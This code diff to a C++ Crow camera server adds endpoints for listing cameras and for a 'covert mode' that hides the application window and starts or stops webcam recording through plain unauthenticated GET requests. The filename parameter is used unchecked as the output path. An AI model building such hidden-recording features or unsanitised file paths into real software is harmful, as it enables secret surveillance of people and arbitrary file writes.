@@ -140,12 +140,15 @@ int main()
         return response;
     });
 
-    CROW_ROUTE(app, "/startRecording")([&camera](const crow::request& req){
+    CROW_ROUTE(app, "/startRecording")
+    .methods(crow::HTTPMethod::POST, crow::HTTPMethod::GET)
+    ([&camera](const crow::request& req){
         crow::json::wvalue response;
-        auto query_params = crow::query_string(req.url);
-        
         std::string filename = "static/output/recording_" + std::to_string(time(nullptr)) + ".avi";
         double fps = 30.0;
+        
+        // Handle both query parameters and form data
+        auto query_params = crow::query_string(req.url);
         
         // Parse query parameters
         auto filename_param = query_params.get("filename");
@@ -212,6 +215,100 @@ int main()
         
         response["files"] = std::move(files);
         response["status"] = 200;
+        return response;
+    });
+
+    CROW_ROUTE(app, "/getCameraInfo")([&camera](){
+        crow::json::wvalue response;
+        CameraInfo info = camera.getCameraInfo();
+        response["message"]["index"] = info.index;
+        response["message"]["name"] = info.name;
+        response["message"]["width"] = info.width;
+        response["message"]["height"] = info.height;
+        response["message"]["fps"] = info.fps;
+        response["message"]["isOpened"] = info.isOpened;
+        response["status"] = 200;
+        return response;
+    });
+
+    CROW_ROUTE(app, "/listCameras")([](){
+        crow::json::wvalue response;
+        std::vector<CameraInfo> cameras = CameraCapture::listAvailableCameras();
+        std::vector<crow::json::wvalue> cameraArray;
+        for (const auto& cam : cameras) {
+            crow::json::wvalue camObj;
+            camObj["index"] = cam.index;
+            camObj["name"] = cam.name;
+            camObj["width"] = cam.width;
+            camObj["height"] = cam.height;
+            camObj["fps"] = cam.fps;
+            camObj["isOpened"] = cam.isOpened;
+            cameraArray.push_back(camObj);
+        }
+        response["cameras"] = std::move(cameraArray);
+        response["status"] = 200;
+        return response;
+    });
+
+    CROW_ROUTE(app, "/toggleCovertMode")([](){
+        crow::json::wvalue response;
+        bool result = CameraCapture::setCovertMode(true); // For now, always enable covert mode
+        if (result) {
+            response["message"] = "Covert mode enabled - application window hidden";
+            response["status"] = 200;
+        } else {
+            response["message"] = "Covert mode not supported on this platform";
+            response["status"] = 200; // Still return 200 as it's not an error per se
+        }
+        return response;
+    });
+
+    CROW_ROUTE(app, "/startCovertRecording")
+    .methods(crow::HTTPMethod::POST, crow::HTTPMethod::GET)
+    ([&camera](const crow::request& req){
+        crow::json::wvalue response;
+        std::string filename = "static/output/covert_recording_" + std::to_string(time(nullptr)) + ".avi";
+        double fps = 30.0;
+        
+        // Handle both query parameters and form data
+        auto query_params = crow::query_string(req.url);
+        
+        // Parse query parameters
+        auto filename_param = query_params.get("filename");
+        if (filename_param) {
+            filename = std::string(filename_param);
+        }
+        
+        auto fps_param = query_params.get("fps");
+        if (fps_param) {
+            try {
+                fps = std::stod(std::string(fps_param));
+            } catch (const std::exception&) {
+                // Use default FPS if parsing fails
+            }
+        }
+        
+        bool result = camera.startCovertRecording(filename, fps);
+        if (result) {
+            response["message"] = "Covert recording started: " + filename;
+            response["status"] = 200;
+        } else {
+            response["message"] = "Failed to start covert recording";
+            response["status"] = 500;
+        }
+        return response;
+    });
+
+    CROW_ROUTE(app, "/stopCovertRecording")([&camera](){
+        crow::json::wvalue response;
+        std::string result = camera.stopCovertRecording();
+        if (!result.empty()) {
+            response["message"] = "Covert recording stopped: " + result;
+            response["status"] = 200;
+        } else {
+            response["message"] = "No covert recording to stop";
+            response["status"] = 500;
+        }
         return response;
     });
 
